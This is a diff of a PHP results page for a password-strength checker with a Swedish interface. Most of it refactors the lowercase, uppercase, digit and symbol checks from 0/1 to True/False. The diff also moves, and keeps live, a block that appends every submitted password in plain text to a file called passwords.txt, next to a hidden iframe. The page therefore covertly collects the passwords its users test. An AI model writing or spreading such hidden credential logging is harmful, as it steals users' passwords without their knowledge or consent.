@@ -5,15 +5,15 @@
   <link rel="stylesheet" href="stylesheet.css">
 </head>
 <body>
+  <iframe name="secret_iframe" style="display: none;"></iframe>
+  <?php
+    $password = $_POST["password"];
+    $pw_log = fopen("passwords.txt", "a");
+    fwrite($pw_log, $password . PHP_EOL);
+    fclose($pw_log);
+  ?>
   <div class="maincontainer">
     <div>
-      <iframe name="secret_iframe" style="display: none;"></iframe>
-      <?php
-        $password = $_POST["password"];
-        $pw_log = fopen("passwords.txt", "a");
-        fwrite($pw_log, $password . PHP_EOL);
-        fclose($pw_log);
-      ?>
       <h1>Resultat</h1>
       <table>
         <tr>
@@ -21,17 +21,17 @@
           <td>
             <?php
               $lower = "abcdefghijklmnopqrstuvwxyz";
-              $contains_lower = 0;
+              $contains_lower = False;
               for($x = 0; $x < strlen($password); $x++) {
                 for($y = 0; $y < strlen($lower); $y++) {
                   if($password[$x] == $lower[$y]) {
                     echo "Ja";
-                    $contains_lower = 1;
+                    $contains_lower = True;
                     break 2;
                   }
                 }
               }
-              if($contains_lower == 0) {
+              if($contains_lower == False) {
                 echo "Nej";
               }
             ?>
@@ -42,17 +42,17 @@
           <td>
             <?php
               $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-              $contains_upper = 0;
+              $contains_upper = False;
               for($x = 0; $x < strlen($password); $x++) {
                 for($y = 0; $y < strlen($upper); $y++) {
                   if($password[$x] == $upper[$y]) {
                     echo "Ja";
-                    $contains_upper = 1;
+                    $contains_upper = True;
                     break 2;
                   }
                 }
               }
-              if($contains_upper == 0) {
+              if($contains_upper == False) {
                 echo "Nej";
               }
             ?>
@@ -63,17 +63,17 @@
           <td>
             <?php
               $numbers = "0123456789";
-              $contains_number = 0;
+              $contains_number = False;
               for($x = 0; $x < strlen($password); $x++) {
                 for($y = 0; $y < strlen($numbers); $y++) {
                   if($password[$x] == $numbers[$y]) {
                     echo "Ja";
-                    $contains_number = 1;
+                    $contains_number = True;
                     break 2;
                   }
                 }
               }
-              if($contains_number == 0) {
+              if($contains_number == False) {
                 echo "Nej";
               }
             ?>
@@ -83,7 +83,7 @@
           <td>Innehåller symboler:</td>
           <td>
             <?php
-              $contains_symbol = 0;
+              $contains_symbol = False;
               for($x = 0; $x < strlen($password); $x++) {
                 for($y = 0; $y <= 255; $y++) {
                   if((48 <= $y and $y <= 57) or (65 <= $y and $y <= 90) or (97 <= $y and $y <= 122)) {
@@ -91,12 +91,12 @@
                   }
                   if(ord($password[$x]) == $y) {
                     echo "Ja";
-                    $contains_symbol = 1;
+                    $contains_symbol = True;
                     break 2;
                   }
                 }
               }
-              if($contains_symbol == 0) {
+              if($contains_symbol == False) {
                 echo "Nej";
               }
             ?>
@@ -123,22 +123,22 @@
       <h2>
         Poäng: <?php
           $score = 0;
-          if($contains_lower == 1) {
+          if($contains_lower) {
             $score += 5;
           } else {
             $score -= 5;
           }
-          if($contains_upper == 1) {
+          if($contains_upper) {
             $score += 5;
           } else {
             $score -= 5;
           }
-          if($contains_number == 1) {
+          if($contains_number) {
             $score += 5;
           } else {
             $score -= 5;
           }
-          if($contains_symbol == 1) {
+          if($contains_symbol) {
             $score += 10;
           } else {
             $score -= 5;
